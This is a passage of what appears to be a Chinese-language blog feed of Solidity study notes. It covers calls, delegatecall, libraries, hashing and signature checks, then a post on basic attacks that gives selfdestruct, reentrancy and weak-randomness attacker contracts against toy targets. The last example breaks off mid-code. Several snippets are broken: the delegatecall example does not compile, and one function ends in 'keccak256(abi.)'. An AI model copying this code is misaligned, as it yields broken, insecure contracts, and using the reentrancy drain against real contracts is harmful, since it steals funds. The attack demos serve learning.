count;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">(address _counter)</span>external&#123;</span><br><span class="line">        ICounter(_counter).inc();</span><br><span class="line">        count=ICounter(_counter).count();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//假如不知道Counter合约的源代码</span></span><br><span class="line">contract Counter&#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external&#123;</span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">dec</span><span class="params">()</span>external&#123;</span><br><span class="line">        count -=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p><h2 id="低级调用call-函数签名"><a href="#低级调用call-函数签名" class="headerlink" title="低级调用call(函数签名)"></a>低级调用call(函数签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract TestCall&#123;</span><br><span class="line">    <span class="built_in">string</span> public message;</span><br><span class="line">    uint public x;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> message)</span>;</span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;fallback was called&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">(<span class="built_in">string</span> memory _message,uint _x)</span>external payable <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>,uint)</span>&#123;</span><br><span class="line">        message=_message;</span><br><span class="line">        x=_x;</span><br><span class="line">        <span class="keyword">return</span>(<span class="literal">true</span>,<span class="number">999</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Call&#123;<span class="comment">//用call调用合约中的函数</span></span><br><span class="line">    bytes public data;</span><br><span class="line">    function <span class="title function_">callFoo</span><span class="params">(address _test)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success,bytes memory _data)=_test.call&#123;value:<span class="number">111</span>&#125;(abi.encodeWithSignature(</span><br><span class="line">            <span class="string">&quot;foo(string,uint256)&quot;</span>,<span class="string">&quot;call foo&quot;</span>,<span class="number">123</span><span class="comment">//需要调用时转钱就加&#123;value:111&#125;(其中可规定gas用量)，否则不加</span></span><br><span class="line">        ));</span><br><span class="line">        require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">        data=_data;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">callNO</span><span class="params">(address _test)</span>external&#123;</span><br><span class="line">        (<span class="type">bool</span> success,)= _test.call(abi.encodeWithSignature(</span><br><span class="line">            <span class="string">&quot;doesnotexist()&quot;</span></span><br><span class="line">        ));</span><br><span class="line">        require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="委托调用"><a href="#委托调用" class="headerlink" title="委托调用"></a>委托调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.直接调用发生的变化</span></span><br><span class="line"><span class="comment">A calls B,sends 100 wei </span></span><br><span class="line"><span class="comment">        B calls C,sends 50wei</span></span><br><span class="line"><span class="comment">A ---&gt;B ---&gt;C</span></span><br><span class="line"><span class="comment">            msg.sender=B</span></span><br><span class="line"><span class="comment">            msg.value=50</span></span><br><span class="line"><span class="comment">            execute code on C state variables</span></span><br><span class="line"><span class="comment">            use ETH in C</span></span><br><span class="line"><span class="comment">2.委托调用发生的变化</span></span><br><span class="line"><span class="comment">A calls B,sends 100 wei</span></span><br><span class="line"><span class="comment">        Bdelegatecall C</span></span><br><span class="line"><span class="comment">A---&gt;B---&gt;C</span></span><br><span class="line"><span class="comment">            msg.sender=A</span></span><br><span class="line"><span class="comment">            msg.value=100</span></span><br><span class="line"><span class="comment">            execute code on B state variables</span></span><br><span class="line"><span class="comment">            use ETH in B</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract TestDelegatecall&#123;<span class="comment">//测试合约</span></span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line">    function <span class="title function_">setVars</span><span class="params">(uint _num)</span>external payable&#123;</span><br><span class="line">        num=_num;</span><br><span class="line">        sender=msg.sender;</span><br><span class="line">        value=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//委托调用合约,只改变委托合约的变量，不改变测试合约变量，通过测试合约改变了委托合约中的状态变量</span></span><br><span class="line">contract DelegateCall&#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line">    function <span class="title function_">setVars</span><span class="params">(address _test,uint _num)</span>external payable&#123;</span><br><span class="line">        <span class="comment">// _test.delegatecall(</span></span><br><span class="line">        <span class="comment">//     abi.encodeWithSignature(&quot;setVars(uint256)&quot;,_num)</span></span><br><span class="line">        <span class="comment">//     );</span></span><br><span class="line">        _test.delegatecall(</span><br><span class="line">           (<span class="type">bool</span> success ,bytes memory data)= abi.encodeWithSelect(TestDelegatecall.setVars.selector ,_num)</span><br><span class="line">        );</span><br><span class="line">        require(success.<span class="string">&quot;delegatecall failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用new来创建合约"><a href="#用new来创建合约" class="headerlink" title="用new来创建合约"></a>用new来创建合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Account&#123;</span><br><span class="line">    address public bank;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor(address _owner)payable&#123;</span><br><span class="line">        bank=msg.sender;</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract AccountFactory&#123;</span><br><span class="line">    Account[]public accounts;</span><br><span class="line">    function <span class="title function_">createAccount</span><span class="params">(address _owner)</span>external payable&#123;</span><br><span class="line">        Account account=new Account&#123;value:<span class="number">111</span>&#125;(_owner);<span class="comment">//创建合约</span></span><br><span class="line">        accounts.push(account);<span class="comment">//将合约添入数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="库合约-library"><a href="#库合约-library" class="headerlink" title="库合约(library)"></a>库合约(library)</h2><p><strong>库合约就是自定义函数用来防止重复代码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">library Math&#123;</span><br><span class="line">    function <span class="title function_">max</span><span class="params">(uint x,uint y)</span>internal pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x&gt;=y?x:y;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">find</span><span class="params">(uint []storage arr,uint x)</span>internal view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]==x)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Test&#123;</span><br><span class="line">    function <span class="title function_">testMax</span><span class="params">(uint x,uint y)</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(x,y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestArray&#123;</span><br><span class="line">    using Math <span class="keyword">for</span> uint[];<span class="comment">//相当于我们把库运用到数组这个类型</span></span><br><span class="line">                           <span class="comment">//这个类型就拥有了这个库的所有函数的功能</span></span><br><span class="line">    uint []public arr=[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>];</span><br><span class="line">    function <span class="title function_">testFind</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint i)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.find(arr,<span class="number">2</span>);<span class="comment">//没有用using的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p><strong>用于签名获取特定的id</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract HashFunc&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">encode</span><span class="params">(<span class="built_in">string</span> memory text0,<span class="built_in">string</span> memory text1)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> abi.encode(text0,text1);<span class="comment">//返回值会补充0</span></span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">encodePacked</span><span class="params">(<span class="built_in">string</span> memory text0,<span class="built_in">string</span> memory text1)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(text0,text1);<span class="comment">//不会补充零，造成漏洞 &quot;AAA&quot;&quot;BB&quot;的返回值与&quot;AA&quot;&quot;ABB&quot;一模一样</span></span><br><span class="line">    &#125;                                       <span class="comment">//AAA BB表示是传入的text0与text1</span></span><br><span class="line">    function <span class="title function_">hash</span><span class="params">(<span class="built_in">string</span> memory text,uint num,address addr)</span>external pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> keccak256(abi.encodePacked(text,num,addr));<span class="comment">//encodePacked这种会造成哈希碰撞</span></span><br><span class="line">                                                        <span class="comment">//就是打包之后&quot;AAA&quot;&quot;BB&quot;的哈希与&quot;AA&quot;&quot;ABB&quot;一样</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//encodePacked漏洞解决：在两个text之间uint一个数，这样就解决了</span></span><br></pre></td></tr></table></figure></p><h2 id="在智能合约中验证签名"><a href="#在智能合约中验证签名" class="headerlink" title="在智能合约中验证签名"></a>在智能合约中验证签名</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">四步骤:</span></span><br><span class="line"><span class="comment">1.message to sign</span></span><br><span class="line"><span class="comment">2.hash(message)</span></span><br><span class="line"><span class="comment">3.sign(hash(message),private key) | offchain(链下完成)</span></span><br><span class="line"><span class="comment">4.ecrecover(hash(message),signature)==signer  恢复签名，得出签名人的地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract VerifySig&#123;<span class="comment">//签名的验证</span></span><br><span class="line">    function <span class="title function_">verify</span><span class="params">(address _signer,<span class="built_in">string</span> memory _message,bytes memory _sig)</span></span><br><span class="line">        external pure <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>  <span class="comment">//_sig 签名结果</span></span><br><span class="line">    &#123;</span><br><span class="line">        bytes32 messageHash=getMessageHash(_message);</span><br><span class="line">        bytes32 ethSignedMessageHash=getEthSignedMessageHash(messageHash);</span><br><span class="line">        <span class="keyword">return</span> recover(ethSignedMessageHash,_sig)==_signer;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getMessageHash</span><span class="params">(<span class="built_in">string</span> memory _message)</span>public pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(_message));<span class="comment">//第一次加密</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getEthSignedMessageHash</span><span class="params">(bytes32 _messageHash)</span>public pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;<span class="comment">//第二次加密</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>,_messageHash));<span class="comment">//两次哈希且增加字符串更安全</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes memory s)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n&quot;</span>, toString(s.length), s));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">toTypedDataHash</span><span class="params">(bytes32 domainSeparator, bytes32 structHash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 _ethSignedMessageHash,bytes memory _sig)</span></span><br><span class="line">        public pure <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">        &#123;<span class="comment">//得到签名人地址</span></span><br><span class="line">            (bytes32 r,bytes32 s,uint8 v)=_split(_sig);</span><br><span class="line">           <span class="keyword">return</span> ecrecover(_ethSignedMessageHash,v,r,s);</span><br><span class="line">        &#125;</span><br><span class="line">        function _split(bytes memory _sig)internal pure<span class="comment">//分割</span></span><br><span class="line">            returns(bytes32 r,bytes32 s,uint8 v)<span class="comment">//32+32+1=65位的长度</span></span><br><span class="line">        &#123;<span class="comment">//将加密信息分割成r s v</span></span><br><span class="line">           require(_sig.length==<span class="number">65</span>,<span class="string">&quot;invalid length&quot;</span>);</span><br><span class="line">           assembly &#123;<span class="comment">//用内联汇编进行分割_sig（只能）</span></span><br><span class="line">                r:=mload(add(_sig,<span class="number">32</span>))</span><br><span class="line">                s:=mload(add(_sig,<span class="number">64</span>))</span><br><span class="line">                v:=byte(<span class="number">0</span>,mload(add(_sig,<span class="number">96</span>)))</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    function toString(uint256 value) internal pure returns (<span class="built_in">string</span> memory) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="number">0</span>) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        <span class="keyword">while</span> (value != <span class="number">0</span>) &#123;</span><br><span class="line">            digits -= <span class="number">1</span>;</span><br><span class="line">            buffer[digits] = bytes1(uint8(<span class="number">48</span> + uint256(value % <span class="number">10</span>)));</span><br><span class="line">            value /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>(buffer);&#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">get</span><span class="params">(<span class="built_in">string</span> memory _message)</span>public pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="comment">//return keccak256(abi.encodePacked(_message));//第一次加密</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(_message);</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础攻击</title>
      <link href="/2022/10/28/solidity/solidity%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB/"/>
      <url>/2022/10/28/solidity/solidity%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="这是我第一篇文章"><a href="#这是我第一篇文章" class="headerlink" title="这是我第一篇文章"></a>这是我第一篇文章</h2><div class="note default simple"><p>我的小标签 </p></div><h1 id="solidity漏洞"><a href="#solidity漏洞" class="headerlink" title="solidity漏洞"></a>solidity漏洞</h1><h3 id="1，自毁函数攻击"><a href="#1，自毁函数攻击" class="headerlink" title="1，自毁函数攻击"></a>1，自毁函数攻击</h3><p><strong>通过selfdestruce自会函数进行强制转账，导致合约中受到7ether，然后卡死</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract EtherGame&#123;#幸运七游戏：第七个传入以太币的人会得到前面的以太币</span><br><span class="line">    address public winner;</span><br><span class="line">    uint TARGET_AMOUNT=7 ether;</span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value==1 ether,&quot;you can only send 1 ether&quot;);</span><br><span class="line">        uint balances=address(this).balance;</span><br><span class="line">        require(balances&lt;=TARGET_AMOUNT,&quot;game is over&quot;);</span><br><span class="line">        if(balances==TARGET_AMOUNT)&#123;</span><br><span class="line">            winner=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender==winner,&quot;not pass&quot;);</span><br><span class="line">        (bool send,)=msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(send,&quot;failed&quot;);</span><br><span class="line">        winner=address(0);</span><br><span class="line">    &#125;</span><br><span class="line">    function getbalance()public view returns(uint)&#123;</span><br><span class="line">    return address(this).balance;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address  to)external&#123;</span><br><span class="line">            selfdestruct(payable(to));</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="2，重入攻击"><a href="#2，重入攻击" class="headerlink" title="2，重入攻击"></a>2，重入攻击</h3><p><strong>该攻击利用fallback函数的触发来做到递归取款，一直会取以太只到取完。fallback触发条件为：1.收到以太 2.调用合约中不存在的函数时</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.6;#重入攻击只能在0.8.0版本以下</span><br><span class="line">contract Bank &#123;</span><br><span class="line"> mapping(address =&gt; uint) public balances; //账本，用来记录每一个用户的账户余额</span><br><span class="line"> //取款</span><br><span class="line"> function withdraw(uint _amount) external payable &#123;</span><br><span class="line">     //用户余额大于存款额，否侧错误</span><br><span class="line">     require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">     //转账给用户</span><br><span class="line">     (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">     //是否成功，不成功返回数据</span><br><span class="line">     require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">     //扣除转出去的钱</span><br><span class="line">     balances[msg.sender] -= _amount;</span><br><span class="line">     &#125;</span><br><span class="line">     //存款</span><br><span class="line">     function deposit() public payable &#123;</span><br><span class="line">          balances[msg.sender] += msg.value;//存款  [用户可使用]</span><br><span class="line">          &#125;//查看余额</span><br><span class="line">          function getBalance() external view returns (uint) &#123;</span><br><span class="line">              return address(this).balance;</span><br><span class="line">              &#125;</span><br><span class="line">              constructor() payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    //攻击目标</span><br><span class="line">    Bank public bank;</span><br><span class="line">    //参数为攻击目标的地址</span><br><span class="line">    constructor(address payable _address)payable &#123;</span><br><span class="line">        bank = Bank(_address);</span><br><span class="line">        &#125;</span><br><span class="line">        //2攻击</span><br><span class="line">        function attack() external payable &#123;</span><br><span class="line">            bank.deposit&#123;value: 1 ether&#125;();//先存再取出</span><br><span class="line">            bank.withdraw(1 ether);</span><br><span class="line">            &#125;</span><br><span class="line">            //回退</span><br><span class="line">            fallback() external payable &#123;</span><br><span class="line">                if (address(bank).balance &gt;= 1 ether) &#123;</span><br><span class="line">                    bank.withdraw(1 ether);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 查看合同余额</span><br><span class="line">                    function getBalance() external view returns (uint) &#123;</span><br><span class="line">                        return address(this).balance;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="3，随机数攻击"><a href="#3，随机数攻击" class="headerlink" title="3，随机数攻击"></a>3，随机数攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract Random&#123;</span><br><span class="line">    function guess()public payable &#123;</span><br><span class="line">        bool result=_getRandom();</span><br><span class="line">        if(result)&#123;</span><br><span class="line">            address _to=msg.sender;</span><br><span class="line">         _to.call&#123;value:1 ether&#125;(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function _getRandom()public view returns(bool)&#123;</span><br><span class="line">        uint random=uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)));</span><br><span class="line">        if(random%2==0)&#123;</span><br><span class="line">            return false;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;return true;&#125;</span><br><span class="line">           </span><br><span class="line">&#125;</span><br><span class="line">constructor()payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function attack(address _random)external payable&#123;</span><br><span class="line">        for(uint i=0;i&lt;1;i++)&#123;</span><br><span class="line">            if(payable(_random).balance&lt;1)&#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            if(uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)))%2!=0)&#123;</span><br><span class="line">                Random(_random).guess();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return 